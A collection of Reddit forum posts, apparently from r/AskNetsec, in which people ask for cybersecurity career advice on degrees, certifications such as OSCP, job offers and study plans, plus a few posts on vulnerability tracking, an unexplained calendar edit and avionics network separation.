Hi everyone, Im currently looking into going to college after taking a break from school after high school. Im very interested in network security, reverse engineering, pen testing (I know its starting to jump around into different categories. Still working out what I really want to do.) While searching for online colleges Im finding several different degrees, bachelors in computer science, bachelors in information assurance, Cybersecurity, etc. What Im wanting to figure out is if any of these are specifically more beneficial to someone in the beginning of their career. Ive been working at a MSP for the past 15 months as a help desk technician II and am wanting to start moving into a more security-related field. I also am enlisted in the Air National Guard with a top secret clearance and CompTIAs Sec+ certification where I work as a sys admin to put it simply. Due to how our base has been moving, my job mainly consists of patch assessment and application, performing basic maintenance on our network equipment, and ensuring the base has access to network shares, etc. with permission management. There is currently only one company near me that actually hires pen testers but was not able to find much more information on them or what other kinds of jobs they hire through their website, so that is why I am more leaning towards a career in pen testing. (Recently married and still sorting our lives/careers out here where we live with no interest in moving any time soon. Obviously drastic circumstances could cause us to need to but nothing foreseeable) Any advice, recommendations, or even just pointing me to some other information is greatly appreciated!

Hi everyone. I work in a small but growing cybersecurity team in a big company. This company is composed of multiple teams building and delivering various systems. Now, these teams would like us to monitor and warn them about vulnerabilities in the OS, tools and libraries they use and integrate. My first constraint is the disconnected nature of these systems. As we don't want the built systems to be impacted by anything, they are not connected neither to our IT network nor the Internet. The OS and softwares installations are prepared on the IT network and systems and transferred via USB keys. Second constraint is that there is no way I can run an agent on their systems nor can I perform scan on their networks (because both ""could be potentially disruptive""). They only want to provide me the list of softwares and versions they use so that we can monitor vulnerable versions. As we are a small and young team in the company, we don't have any power on these projects. I read some docs about Vulnerability Management Processes but all of them include scans, which I cannot perform. I realize scanning is only a small part of the Management Process but I could not find any tool to manage scan-less inventories. Do you know any resource or guide that would help me ? More important, do you know any tool where I could input lists of softwares and versions and then would regularly compare the software list to the list of CVEs, Ovals, whatever to notify me of potentially newly vulnerable versions ?"

Got a bit of a weird situation here that I'm kind of stuck at, and would greatly appreciate the help. I'm a fulltime CyberSec Analyst and Senior going through WGU's Cybersecurity Program. To tl;dr this situation, I'm looking to move into a Penetration Testing/Red Team position following my internship where I'm currently at, and was looking into ECPPT and OSCP to get started. My current employer is willing to pay for at least one of them, possibly more depending on when I tackle them, but as I'm currently doing college, I don't want to have to wait another year at minimum before I start getting into this, and by that time my internship will have run out. So a couple of questions in regards to how I should best approach this: 1. Objectively speaking, how much of a ""Beginner cert"" is OSCP? I keep hearing differing opinions from ""It's an entry level pentesting cert"" to ""It's one of the most difficult exams in the industry, next to ones like CCIE and OSCE"", so I'm a little confused as to what the difficulty of it is beyond Trying Harder. 2. Should I even bother with ECPPT? I've seen online that it's a good starting cert for pentesting, especially in prep for OSCP, but not very many people know about it I don't want to waste my time with a useless cert, as it were. 3. On this note, is the ECPPT training course something I have lifetime access to, by and large? And is the cert provided in the cost of the course, or is that extra? I wasn't able to find much info on the second one on the cert website. 4. Should I try and finish college first, then tackle the certs, or try and do them concurrently? 5. Are there any other resources I should investigate to build the fundamentals of pentesting? I have a number of pentesting books such as Weidman's Guide to Pentesting book and the Web App Hacker's Handbook V2, but any other resources or certs to look into would be very greatly appreciated, especially if I should try and finish college first, then tackle the certs afterwards. I also have VMWare professional w/ a library of things like Kioptrix and other vulnhub images to learn the fundamentals of pentesting. Sorry this is a bit of a hodge podge of questions. I've got a number of other things going on, but I'm really wanting to get these certs as quickly as possible, but without jeopardizing my degree. Thank you muchly!"

I have been looking for a new gig for over 8 months now with no luck and it leaves me quite exasperated. My background: * Malware analysis &amp; Signatures - primarily Android, but have also worked on Symbian, Windows, Linux and the occasional iOS sample. * Vulnerability Research on IoT devices. * I've also spoken and presented my work at a handful of conferences and published/co-authored a couple papers. * Been at the same gig for soon-to-be 7 years, 5 being purely malware analysis/security research (the golden era) and now on Product Security/Incident Response since early last year (prison time). My role was redefined mainly because my n+1 got a promotion and so I was the scapegoat to validate his position in the company. Moreover, the research team was entirely dissolved at my branch at the same time due to a 'suit' n+2 who did not see/understand the value of research to the company. What I'm looking for * Getting back to malware and reverse engineering. * Threat Intelligence * The perfect post would also implicitly promote conference presentations/papers, research and community sharing. * Obviously a promotion to a more senior role (just job title words, I know, but it seems to count). Platforms I've been looking on: * The LinkedIn's, Glassdoor's and even specific company websites * The r/netsec Hiring Threads * ninjajobs * I've also tried getting introductions from common contacts but in the one case I can think of I think I didn't hear back because my experience was more mobile-malware-heavy than Windows-malware. In another instance I was told they were looking for someone 'less technical' (that did not align with the job description they shared imo) The hurdles (so far): * I'm *not* based in the US. That seems to apparently limit so many options of great job postings I come across for the US. As someone who has turned down job offers from Google and Apple since those offers didn't provide the specialization I had/was looking for and came at a time when I wasn't actively looking, I had assumed I had a reasonably good CV. All of that seems to fall flat in the face of sponsorship requirements. I've had recruiters/managers express interest in my CV but the discussion dies a natural death as soon as I mention my location/sponsorship requirements. * While there are few good options closer to home, I'm unable to move in the immediate future due to administrative issues limiting my options to remote jobs. Surprisingly, even remote work in this time and age seem to not be as evident as I had thought. * I'm quite clear and specific on what I'm looking for. That is not to say, the job I'm looking for doesn't exist at all, the ones I've applied to never worked out for reasons other than technical most of the time. My questions to you: * What do you think I'm doing wrong based on what you've read so far? * **Have you had similar experiences despite having a decent profile and experience?** (in bold since my experience baffles me based on all the cybersecurity-skills-shortage-jargon most sec companies spew.) * Bonus question: If anyone involved in hiring is willing to have a look at an anonymous version of my CV, I'd be more than thankful. If you believe in the adage 'if you're not growing, you're dying', I'm dying a slow death everyday with prison time &lt;/dramatic rendition&gt; and would appreciate feedback. TL;DR: Malware analyst/reverse engineer with 7 years experience failing to find a new gig since winter 2016. What am I doing wrong?"

Nuclear Engineering Technology (Excelsior College) * Have 36 months of educational benefit (48 if I chose to get second bachelors because of additional disability benefit that I am eligible for) * Married with 1-1/2 year old daughter * Currently work for Amazon Web Services in non IT position (I have no interest in this job but I make almost 7K a month. Position is in Northern Virginia which is very expensive) **My Options** 1. Accepted into M.S. Cybersecurity online at Excelsior College (30 credits ~1 year 2. Accepted to University of Colorado Boulder for CompSci (2nd undergrad transferring in 57 credits from Excelsior College. ~2 years for undergrad and ~1-2 years for masters program because I have enough G.I Bill) **My Worries** I want to get into this field efficiently, but I really do enjoy learning. I'm teaching myself python and C# right now as well as getting deeper into Kali Linux and linux in general. What I don't want to do is waste time with excessive and unrelated schooling *but* I want to be a prime candidate for a good position when I'm done with the school part. I could just sit at my computer and teach myself all this stuff, however the G.I. Bill gives me a monthly stipend. Either situation, that monthly stipend will be enough to pay the rent (I know that distance learning has a lower payment). "

These reminders were obviously test reminders that someone had created. One was something like ""Gh edditd"" and another was something like ""send test email"". Using a browser, I logged in and made sure that my Google Calendar is not public, and that I've never granted permissions for anyone to make edits. I also looked at the trash for the calendar/account in question and there's nothing in there. Finally, I reviewed all the devices that are currently accessing my Google account and I recognize and can account for all of them. Next I reviewed the apps on my phone that have permission to access my calendar. None of them look suspicious. A full 5 out of 6 are Google apps that come on an Android phone by default: Calendar, Contacts, Gmail, Google App, and Google Play Services. Number 6 is Garmin Connect. I'm also quite positive that none of my computers have been compromised. My one computer was asleep when this all happened and the other one I guess could have been accessed remotely somehow by a hacker, but if it was, the hacker left it exactly as I left it last night when I used it. Any ideas what else it might be? To me it almost looks like a Google engineer was testing something and happened to use my Google account, which I'm sure is extremely unlikely. I'm not a security professional, but as a web app developer I do understand computers/programming/cybersecurity a little better than the average layman. I realize the right thing to do is to change my Google account password, but I'm trying to understand how this could have happened. Any ideas? UPDATE: It's one week later. The problem has not reoccured and I've not found any explanation for the issue or identity of the person/application that made the edits. I'm still leaning pretty heavily towards this being caused by a Google Engineer."

Basically, fitting the saying jack of all trades, master of none. If youve never heard that saying before, here is a link to what Wikipedia has to say (URL Ive had a long security career with its main focus being information security (InfoSec). When I started out in security there were basically two paths, InfoSec or the other guys. There was no cybersecurity or pentester, just the other guys, the attack side of the equation. Interestingly, when I took the CISSP there were ten domains and I dont think the other guys fit any domain well. Now, the domains number eight and there are many careers that can be built on a single domain or even a subsection of one. Although, I understand the 8 domains are a combining and expansion of subject matter rather than a reduction. One question/answer from the FAQ sums it up nicely: Q: How is the CISSP exam changing? A: The CISSP exam is being updated to stay relevant amidst the changes occurring in the information security field. Refreshed technical content has been added to the Official (ISC) CISSP CBK to reflect the most current topics in the information security industry today. Some topics have been expanded (e.g., asset security, security assessment and testing), while other topics have been realigned under different domains. The result is an exam that most accurately reflects the technical and managerial competence required from an experienced information security professional to effectively design, engineer, implement and manage an organizations information security program within an ever-changing security landscape. As a result of the content refresh, we have updated some of the domain names to describe the topics accurately. CISSP Domains, Effective April 15, 2015 * Security and Risk Management (Security, Risk, Compliance, Law, Regulations, Business Continuity) * Asset Security (Protecting Security of Assets) * Security Engineering (Engineering and Management of Security) * Communications and Network Security (Designing and Protecting Network Security) * Identity and Access Management (Controlling Access and Managing Identity) * Security Assessment and Testing (Designing, Performing, and Analyzing Security Testing) * Security Operations (Foundational Concepts, Investigations, Incident Management, Disaster Recovery) * Software Development Security (Understanding, Applying, and Enforcing Software Security) Link: URL I can definitely say that Ive spent time in all domains and some more than others of course. Today I spend most of my time in the Identity and Access Management domain with supporting knowledge from Security and Risk Management, Security Engineering, Communications and Network Security, and Software Development Security. Ive been called a SME (Subject Matter Expert), but typically only when convenient or beneficial for the prime. Otherwise, I truly prefer to understand how the products work instead of how to work the product. Although, the later is what gets me paid many times. That product and hands on experience also helps (IMHO) when in the architect role also. So which are you and whats your specialty? Are you a jack of all trades? A netsecer that does it all or have you grown into a specialty like VPN/Remote access only, network/routing, switching or something else. Maybe youre a sysadmin that now only specializes in AD Forest/Domain infrastructure or email/Exchange only. For us security folks, maybe youre a master at forensics or malware analysis. Let me know and if you got this far thanks for reading. "

Plus virtually zero practical experience. However, the infosec market in my country (a 3rd world Arab country) is pretty much nonexistent. My 2 questions are: 1- Is EC-Council's LPT worth it? I mean do employers look for it usually? or should OSCP suffice? 2- After earning all the certifications I currently have in my to-do list, what are the odds of me finding a job abroad which accepts entry level foreign juniors and provides them with an official Visa?

Its just been deploying firewalls, some switching, some vlans, AP configuration etc. but nothing really hardcore technically. I would say I have a good understanding of network concepts as I do my bit of cbtnuggets and reading etc. And I am pretty good with self-studying and learning how something works from reading and practicing it which most of us in tech do. I could do a good job working firewalls, load balancers, routers etc. I understand these concepts and could easily learn more as needed. But I do hit a block with programming and frankly I just dont enjoy it, the simple reason being its fucking hard for one and maybe I could come up with ten different reasons one being maybe my mind doesnt work that way but I dont think that helps. Sometimes I feel its a self-image(a lil psychology concept) issue where I just tell myself repeatedly i cant code and then later prove it too. Kinda how the i am an introvert thing works. Having said that, Id also add I do understand the programing concepts etc. and can work with developers and programmers. I dont think thats going to be a problem. I am quite technically oriented but its the actual coding which I dont think I would really like to get into. Now at 25 I have decided to move out abroad for work, something which has always been on my mind. One of my options is to go for an MS Cybersecurity degree in the US. I read some other posts on it and it seems given my limited skillset right now an MS could be ideal. Will my lack of skills/interest in programming be a major hurdle for the MS program and my cybersecurity career on the whole? A lot of articles i have read on cybersecurity suggest programming is a must. Also what kind of courses and universities and the eventual job prospects(mgmt?, incident handling?, auditing?, BlueTeam?) should I be looking at? Some salary and growth ideas would be nice too."

I'm the only one without a degree even though I have CISSP, CSSLP and I'm getting a CISM. I didn't finish my bachelor degree as I could not afford to attend full time and I had to work, long story short I dragged the bachelor degree in CS for 15y and fast forwarding to now I have three exams to go. Close to my new office there is a college and they are going to provide evening classes to get an MSc in CyberSecurity, due to my experience they will accept me in the MSc courses even if I've not officially finished the BSc so basically I would be able to get an MSc in 2 years part time. In term of contents, I've almost touched all the topic of the courses so I won't extremely boost my knowledge but I will just get a certificate of my knowledge. Do you think that career wise will it worth to get an MSc in CyberSecurity after I spent 16y in the field or am I going to waste my time and money? My peer believes that having a BS not finished in computer science on CV going on for 15y is a very bad presentation card and getting an MSc in CyberSecurity will boost my credibility and will give me access to even higher roles (management, director role and so on) which are the roles that I want to obtain. I believe that my peers are right and I'm worried that without a degree I would not be able to compete for security manager, security director role or similar in the next years. What do you think? update: so folks, if I will not land a job in Dubai I'll start my MSc. I concour that this will not help me become a CISO and I concur that an MBA will be more helpful but looking at the course I'm sure I'll have a lot of fun. The couses are going to be based on the books I always wanted to read but I haven't t.

Well actually they just make all the ""cheap"" areas near me look shitty. I got a tentative job offer from the DoD. Employment is (obviously) conditional on passing a background check) I need to complete the forms and pass the background check before I get a ""real"" job offer. The job requires a clearance which I don't yet have but would likely (eventually) acquire wherever I go to work. I have to get the forms back to the DoD within a couple weeks so they can start doing background check stuff. The clearance would be TS. I don't foresee anything that would make me ineligible for a TS clearance. I've got two summer internships at a multinational defense contractor. One was doing some security related stuff with network traffic for customers, the other was plain old software development. I'm about to be entering my senior year in college and am planning on seeking employment at that company in a cyber-security related role. Based on how these past two summers have went I don't think I'd have a problem finding a good job by the time I graduate. Here's my dilema. The DoD job is a offensive position. The group I would be working for does offensive stuff. To me that's really important because it's something I really want to get paid to do and IMO it's a heck of a thing to have on your resume. Short of pen-testing there aren't many other opportunities to get paid to do offensive work. The job sounds great. What doesn't sound great is the pay. I'd get ~50k + a $10k signing bonus. The opportunities for increased pay aren't that great and are very well defined. I know that there are very good retirement and health-care benefits available to federal employees but I won't be needing the former for a very long time and am very unlikely to need much of the latter. What I'm worried about is this impacting my future. I don't want to be that guy who makes 1mil less over his career because he started out making 10k less on day 1. For comparison, I have three friends with similar qualifications, also working in cybersecurity that started with ~80k salaries. After cost of living adjustments for where they work vs where I'd be working it's probably closer to 70k Part of me says that I'm over thinking it and should just take the DoD job because it's a fairly unique opportunity and I can just negotiate my way out of being shortchanged by future employers (I'm not too bad at negotiating, I sure as heck don't fear it like some people do). Another thought that crossed my mind is that I should email my recruiter and see if there's anything he can do to get me started at a higher spot in the pay-scale or include student loan repayment (I have under $30k in loans) or some other thing as part of my offer. $50k seems really low to me considering that my intern hourly wages extrapolate to a ~$40k salary and employers are paying about double that for my college buddies with nearly identical qualifications. Anyone have any advice? tl;dr: Would you take a low paying gov't job as your first job out of college if it was something you really wanted to do?"

And I apologize for the long post in advance, but I really need your help, as my whole future depends on your help, and this important post. I am interested in Information Security, in fact, I have a strong passion in it, and that's why I chose IT Security over Medicine, Passion over Money/Prestigious. So I decided to make it my job field. I am enrolled in a Computer science program in a university, 1 month and 12 days left for it to start. I plan to have a master degree in CyberSecurity/IT Security if it's worth it. I have prior experience in hacking some machines, but nothing major, I was just a script kiddie unfortunately. And as I want to be a professional hacker/penetration tester, I am building the right strong skillset, including programming, networking, operation systems...before I start hacking any machine, or studying any security related degree/certification. I reached the part of my plan where I learn networking, my plan was like this: Network+ &gt; CCENT &gt; CCNA R&amp;S. I was planning to study them now, and take the exams in my last university year. The main reason I wanted to have those certification (or the CCNA R&amp;S) in my resume is to approve that I understand networking. So, I got the ""CompTIA Network+ All-In-One Exam Guide, Sixth Edition(Exam N10-006)"" Mike Meyer's book, and got shocked by how much information is need to be memorized in order to pass the exam, and understanding that information (which is the only needed in the real world field) isn't enough to. And, this is just the basic network+ cert., so the CCNA R&amp;S has much more to memorize (probably 1000+ pages). Also, all that memorization is not needed in the security/hacking field, I just need to understand TCP/IP, know how to pivot, understand wireshark, understand how firewalls work..I don't need to know how to configure 100+ switches with 30+ firewalls, and some load balancers, that is the networking man job. I understand that to hack a network protected using a firewall, and an IPS for example, i need to understand both of them in order to hack it, and that's what I am gonna do, I want to understand and memorize what's needed for hacking, but not 4000+ pages of networking at least. And i am gonna deploy that practically in labs. I am gonna configure switches, routers, firewalls, IPS &amp; IDS.., but I am not gonna memorize tons of things, just to pass a certification, that I am not gonna use, neither in the job, nor in my own hacking journey. Then, I kept thinking, is studying them using ""books maybe + cybrary + labs -packet tracer, virtual networks using vmware workstation-"" enough to fill this gap ? I checked indeed.com to see some job posts, and what they require, and no one required having those certifications, just a few required understanding TCP/IP. This same thing applies to Microsoft, and Red Hat, I planned to get some of their certifications, to approve that I understand Windows and Linux, but i think there is no need anymore. I can self-study them without getting a certification, for my knowledge base only, and focus on the security certifications, so I can now achieve the CEH (just to pass the HR), OSCP, maybe elearnsecurity (their courses are good, but their certifications are not well known unfortunately, so I don't know if it will help me getting a good job), and much more. And I thought, doesn't achieving OSCP approve that I understand the needed knowledge to do a penetration test ? Such as TCP/IP understanding, wireshark, linux, windows, scripting...as this knowledge is required to pass it! So, I can approve it to the employer this way. So now, I can achieve some important security certifications within my bachelor years, then I can join a master security degree if it's worth it (in USA or EUROPE) OR I will get a good security-related job immediately after graduation (I don't study in USA or Europe currently, but I would like to work there, as the people there appreciate Information Security much more than here), and then, I will start harvesting SANS certifications -i wish i can afford them on my own now-, and after some years, I will get the CISSP, and maybe then I can work as a CISO! Which is my goal, to be a CISO (As I know, it's the most paying and prestigious job in this field). In the same time, I will study security books as much as I can, I will build my own lab, I will use vulnerable machines such as the vulnhub's ones, i will use ctf365.com, I will stay up to date with security news and vulnerabilities, I will donate to penetration test local companies, i will attend CTFs, conferences, and bug bounty programs, I MAY make a blog, and I will do my best to fill up my resume (I will make a seperate post to gather as much as possible on what things can help my resume). You may ask, why did I post this if I already made my decision ? I didn't. I am still worried what is the right thing to do, that's why I need your help. I don't know what is better. I don't know if my path will work or not. I apologize for the long post. I hope you answer my following questions, and I appreciate any additional advice and suggestions. I hope you correct and direct me to the right path. My whole future depends on your help. 1. Can I get a security-related job immediately after graduation (I mean my first job is security-related one) with a CS BA degree, CEH cert., OSCP cert., and the self-study stuff that can be put on the resume (such as: books, online courses, achievements, donations, a blog, CTFs, conferences, bug bountry programs...) ? 2. Is my plan/path realistic ? 3. Can the CISO level be achieved this path ? (I think I need a management/Business certification to be a CISO) 4. Additional notes, advice, and suggestions are appreciated. Thanks in advance. -LonVenu | Reddit"

I have some experience with the popular security tools (nessus, nmap, metasploit, wireshark, etc) but in NO way an expert of any of them.. I'm at the level to be able to use them without being completely lost. I'm fairly comfortable with general networking, server management, and other foundational knowledge that comes with system administration. So what I'm looking for is suggestions on what to study for this interview so I can walk in with good general knowledge and at least be semi-prepared. I don't have much time, this whole thing is very sudden.. But I want to at least give it a shot. I know its not realistic to cram for a job like this... but I figured worst case scenario I won't get the job but I'll learn a thing or two. Can't hurt to try, right? So if you had to study for a pentesting position, what would you do? Thanks for ANY help. Edit: It isn't a senior level job or anything, so I'm not completely crazy :) . "
1134,cybersecurity,AskNetsec,Second round interview for junior security analyst position. Got wind of the scope of questioning and would like insight.,1,4ogwca,https://www.reddit.com/r/AskNetsec/comments/4ogwca/second_round_interview_for_junior_security/,2016-06-17 11:40:15,"Hey guys, basically I have the second round of interviewing coming up, and the individual interviewing me is responsible for basically the budgeting of switches,firewalls,almost all hardware, and non cyber security related personal that will be the arms and legs in a sense, of working with the cyber security team. The line of questioning will be revolving around how I think cybersecurity and the other IT dominions within the company need to work with each other, and how budgeting should be basically allocated. As far as working with the other IT departments(the windows engineers for the end users,the linux engineers for the servers, the developers for the web apps, etc) to me it seems obvious that communication is key. Being able to talk their language when it comes to allowing our team to instill a security culture, have them given the proper trainings, etc.(web apps have vulnerabilities as developers make assumptions about how users interact with the application, the windows engineers may not be patching frequently enough, weak domain credentials, end users could cause devastating consequences for the company if they aren't savy with phishing attacks, linux admins may be running services that are vulnerable or running services that aren't in use and therefore should just be disabled for the sake of it etc) Security is a layered defense in depth approach. starting from the wan and acls, to the firewall and ids/ips, to the AV/content filtering at a network level, down to least privileged models and end user AV and everyone needs to be on board and on the same level. I have ideas about risk models, where one measures the impact, threat, and vulnerability and weighs out how to ration the budget by analyzing the total risk based on the weights of those 3 factors. Especially implementing data classification and labeling, and allocating based on the classification system of sensitivity.(this is a financial company) I am not sure I am on the right track. It seems kind of vague I know, so I was kind of hoping for some guidance. Please be easy on me and don't spoon feed me. Just pointing me in the right direction on some resources I can dive into would even help. I am not sure how horrible my potential answers sound, it is a junior position and I am just starting out, but that is what is in my head right now. Feel free to give me feedback.

Here's my update so far.,22,4jwhfv,https://www.reddit.com/r/AskNetsec/comments/4jwhfv/a_year_ago_i_asked_about_norwich_universitys/,2016-05-18 22:46:49,"Long read incoming. [Here's the curriculum for those interested](URL So I was already enrolled and 1 week away from starting my class at the time I posted the [first topic here](URL Since then I've gone through 3 semesters and know what to expect from here on out. For those unaware, it is an online program that is highly ranked by multiple sources ^[1](URL ^[2](URL ^[3](URL and NSA accredited. It's also a very new program and different than the ones people have graduated from in my previous topic. As a preface, I currently work as a InfoSec Analyst for an enterprise company and formerly worked for as a sys admin and a cyber forensic consultant. Anyways, so the classes are very different in terms of difficulty. For example I took a Linux Administration course and it was not very difficult at all. We spent only a few weeks on BASH scripting and the rest doing stuff I don't think I'll ever use again. Their programming courses (1 &amp; 2) aren't general programming courses and the description is pretty awful in the curriculum. Programming 1 is C++ and that's it. As most people know, C++ is definitely not the first language recommended to learn as it's pretty hard. I know a little Python and Javascript so I knew the basics of programming, but C++ being an object-oriented language is hard to learn, especially right out the gate. Programming 2 is Assembly, which is what I take in 5 weeks. I asked my professor why they have it set up like this and he says because after Programming 1 and 2 you take Malware Forensics, which he says Assembly is heavily needed for. I haven't done any malware forensics yet on the job, I've just sandboxed them inside a VM to see what they do and how to remove them. The professors/teachers are hit or miss. I had to take a criminal forensics course to satisfy a science elective and she was not very good at all. It was one of those classes where you would read a chapter that was like 20 pages long at most a she'd make you write a 21 page essay about it. My linux admin instructor was awful and graded nothing until the last week. My C++ instructor is very good though, he responds very quickly and grades fairly. C++ is a hard course as I said before, so having a good instructor makes it a lot better to take on. Overall, for the price you pay per credit and the actual *quality* of the content is very good. From what I've experienced in the classes I've taken is I learned what I needed to. Already knowing about Linux and Windows made their admin classes a breeze and I did learn things. The C++ is a good course so far, with my only complaint being I wish there was an actual lab that guides you through a program instead of just a worksheet. I think my only major issue with this course so far is that there's no Python or JavaScript course, which are absolutely huge in infosec. You do learn SQL which I have yet to take, but not having a Python and JS course is kinda dumb. Their Pentesting courses still aren't available for anyone and open in the Fall from what I've heard, so I am anxious to take them. If anyone has any questions I'll be happy to answer them."

Tall white dude, no affirmative action love for me. Rapidly going grey, thankfully not going bald. * BA CS, MBA Info Assurance (first-year MBA curriculum and then second-year courses same as business school's one year MS Info Assurance), law degree. * Five years of solo law practice (financial privacy, asset protection, regulated industries/financial sector, and varied litigation experience). * Four years teaching databasing and applied programming (TA in grad school, MS Access and VB, 1500 students). * Three years sysadmin (in undergrad). * Managed non-profit student-owned legal services office. * Internships in software development and Big 4 SAS 70/SSAE16 auditing. * Peer-reviewed scholarly article (best paper at my large state's cybersecurity conference) on HIPAA database privileges for first responders in the wake of natural disasters; peer-reviewed law review articles on virtual property, virtual world regulation and policing intellectual property infringement in Second Life; advice for employers on PCI-DSS compliance and several general HR publications. **Gameplan**: 1. I'm in a small-ish town (1.5M people in the metro) with a newly-opening 24x7x365 SOC for a large regional bank. I'm gunning for their SOC analyst position (BS + interest in cybersec posted minimum quals) to get back into the fold. 2. In two years I hope to move into a more specialized position within the SOC or the security team (at the same company or elsewhere); either SOC lead or on the incident response team. I think IR makes the most sense from my background and interests. I intend to get the CISSP (because HR drools on it &amp; the experiential requirement) during this time. 3. I figure I may need to relocate to a bigger city/change employers after 2 or 3 more years for a managerial position steering operations or perhaps security architect, get the CISM, and maybe another move after a few more years for a C-level position steering policy and risk management. **Comedy Alternate Gameplan**: Enlist in the Navy for 6 years. Do cryptologic technician (""Navy hacker"") rating to wipe out my student loans and get certifications, and then do main gameplan beginning at #2. I think this is a bad idea because the private sector has more potential in information security and policy than the government. Even including government contracting, which I figure is full of ex-officers and retired career enlistedmen with a strong good old boy network. **Questions**: 1. Are there other roles after the SOC that merit consideration over incident response based on my background? Is there a speciality that is more frequently a feeder for executive security roles? I considered audit but figured that there's less promotion potential out of audit than incident response. 2. Security+ (like a lot of CompTIA) seems like a retread; I get 90% of the practice questions right. Should I get it if on my own dime? I put my odds of doing DoD 8570 work pretty low. 3. Any opinions of the Certified Information Privacy Professional (CIPP/US)? Encounter any in your work? 4. Would staying firmly in one regulated industry (e.g. financial or health) be preferable over experience in that and another industry, or in a less-regulated industry (consumer goods, tech startup, etc.)? 5. Should my gameplan include a stop at a vendor/managed service provider/consultancy (e.g. Accenture, Palantir, Dell, FIS, Big 4) or stay in-house the whole way? **The $64,000 questions**: Is it feasible? If I perform like a goddamn superstar is it reasonable? If not, what changes would you make to the gameplan and expectations? Thank you for your wisdom and for having read this far."

I'm strongly thinking dropping at the end of this semester and go and get an associates in Cybersecurity/CIT from a local community college (Which is also a SUNY - so all credits transfer no problem), and self-studying for certifications (SEC+/CEH/OSCP/etc.) I was also thinking about transferring into either RIT or NYU after I get my associates for I hear they have a great security curriculum (especially with NYU and PPP). I already know what I want to do and have collected enough information to self-study anything from programming &amp; reversing to networks and infrastructure, but I'm trying to make sure that I would still be hire-able if I do indeed go down this route, or if I'm going about this the completely wrong way."

We normally discuss industry security topics and have a friendly, but technical discussion. There was one line that caught my eye: &gt; GAO investigators spoke to cybersecurity experts who said onboard firewalls intended to protect avionics from hackers could be breached if flight control and entertainment systems use the same wiring and routers. So what they are saying is that it is normal to have either the avionics and infotainment systems on the same network OR virtually separated (VLAN, etc)?? I was under the impression that it was all physically separated - avionics network, infotainment network completely physically separated. So, for example, if someone hacked into the infotainment network via wifi, then potentially, they could down that system or upload/download shit over the cellular/satellite connected internet. Now, if it was virtually separated by a VLAN or other mechanism and the person got into the avionics, that would be very bad. I do not know much about how avionic systems work, but I can imagine terrible things could happen or not - read-only status of flight data. If the systems were physically separated, then the intrusion stops at the infotainment network/systems. I find it disturbing that that statement *could* be true.
